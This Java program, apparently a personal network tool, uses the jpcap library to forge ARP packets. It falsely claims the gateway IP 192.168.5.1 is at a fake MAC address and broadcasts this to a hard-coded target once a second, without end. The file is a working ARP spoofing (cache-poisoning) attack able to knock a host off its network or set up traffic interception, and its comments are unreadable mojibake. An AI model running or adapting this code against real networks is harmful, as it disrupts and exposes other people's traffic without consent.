package pcap;

import java.net.InetAddress;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import method.MACConvert;

public class ARP {

	public static byte[] stomac(String s) {
		byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
		String[] s1 = s.split("-");
		for (int x = 0; x < s1.length; x++) {
			mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
		}
		return mac;
	}
  
	public static void main(String[] args) throws Exception {
		InetAddress desip = InetAddress.getByName("192.168.5.8");// ����ƭ��Ŀ��IP��ַ
		byte[] desmac = stomac("40-b8-9a-09-82-ff");// ����ƭ��Ŀ��Ŀ��MAC����
		InetAddress srcip = InetAddress.getByName("192.168.5.1");// �ٵ�ԴIP��ַ
		byte[] srcmac = stomac("11-22-33-44-55-66"); // �����ٵ�MAC����ᵼ�²������� ���MAC��ַ���Խػ����� ������ַ����������д ��������·�����Ϊ��ȷMAC��ַ
														// ����Է��ղ���
		// ö�����������豸
		// ö�������豸
		NetworkInterface[] devices = JpcapCaptor.getDeviceList(); // ѡ�������豸
		JpcapSender sender = JpcapSender.openDevice(devices[2]); // �������豸
		String localMAC = MACConvert.macToS(devices[2].mac_address);
		System.out.println(localMAC);
		byte[] mac = MACConvert.sToMAC("74-e5-0b-3a-72-55");

		ARPPacket arp = new ARPPacket();// ����ARP��

		arp.hardtype = ARPPacket.HARDTYPE_ETHER; // Ӳ������
		arp.prototype = ARPPacket.PROTOTYPE_IP; // Э������
		arp.operation = ARPPacket.ARP_REQUEST; // �������� REPLY ��ʾ����ΪӦ��
		arp.hlen = 6; // Ӳ����ַ����
		arp.plen = 4; // Э�����ͳ���

		arp.sender_hardaddr = srcmac; // ���Ͷ�MAC��ַ
		arp.sender_protoaddr = srcip.getAddress(); // ���Ͷ�IP��ַ
		arp.target_hardaddr = stomac("00-00-00-10-00-01"); // Ŀ��Ӳ����ַ
		arp.target_protoaddr = desip.getAddress(); // Ŀ��IP��ַ

		EthernetPacket ether = new EthernetPacket(); // ������̫���ײ�
		ether.frametype = EthernetPacket.ETHERTYPE_ARP; // ����֡������ΪARP֡
		ether.src_mac = devices[2].mac_address; // ԴMAC��ַ
		ether.dst_mac = MACConvert.LinkLayerBroadcastMACBytes; // Ŀ��MAC��ַ
		arp.datalink = ether; // ���

		// ����ARPӦ���
		while (true) {
			System.out.println("sending arp..");
			sender.sendPacket(arp);
			Thread.sleep(1000);
		}
	}

}
